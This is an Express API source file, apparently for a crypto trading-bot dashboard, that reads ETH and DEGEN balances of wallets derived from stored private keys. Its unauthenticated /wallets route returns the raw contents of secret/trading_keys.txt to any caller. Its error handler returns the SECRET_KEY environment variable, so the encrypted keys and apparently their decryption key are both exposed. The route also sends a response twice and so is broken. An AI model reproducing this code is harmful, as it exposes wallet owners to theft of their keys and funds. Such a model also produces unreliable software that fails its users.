// /api/index.js

const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const { connectDB, closeDB, fetchDB } = require("../dst/database");
const { formatEther } = require("viem");
const { privateKeyToAddress } = require("viem/accounts");
const { readFileSync } = require("fs");
const { getBalance, decryptKey } = require("../dst/utils");
const path = require("path");

dotenv.config();

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const DEGEN = "0x95430905F4B0dA123d41BA96600427d2C92B188a";

const app = express();
app.use(cors());

app.get("/api", async (req, res) => {
  try {
    await connectDB();
    const results = await fetchDB();
    res.json(results);
  } catch (error) {
    res.status(500).json({ error: error.message });
  } finally {
    await closeDB();
  }
});

async function getWalletBalance(address) {
  const etherBalance = await getBalance(address, undefined);
  const degenBalance = await getBalance(address, DEGEN);
  const [ether, degen] = [formatEther(etherBalance), formatEther(degenBalance)];
  return { ether, degen, address };
}

app.get("/wallets", async (req, res) => {
  try {
    const rootDir = path.resolve(__dirname, "../");
    const secretFilePath = path.join(rootDir, "secret", "trading_keys.txt");
    let PRIVATE_KEYS;
    try {
      const data = readFileSync(secretFilePath, "utf8");
      res.json({ data });
      const arrayString = decryptKey(data);
      PRIVATE_KEYS = JSON.parse(arrayString);
    } catch (error) {
      console.error("Error reading file", error);
    }
    let main_account = privateKeyToAddress(`0x${PRIVATE_KEY}`);
    let accounts = PRIVATE_KEYS.map((key) => privateKeyToAddress(key));
    const Accounts = [main_account, ...accounts];

    const Balances = await Promise.all(Accounts.map(getWalletBalance));

    res.json(Balances);
  } catch (error) {
    res.status(500).json({ error: error.message, key: process.env.SECRET_KEY });
  }
});

// Local instance
// app.listen(5000, () => {
//   console.log("Server listening on port 5000");
// });

// Vercel instance
module.exports = app;
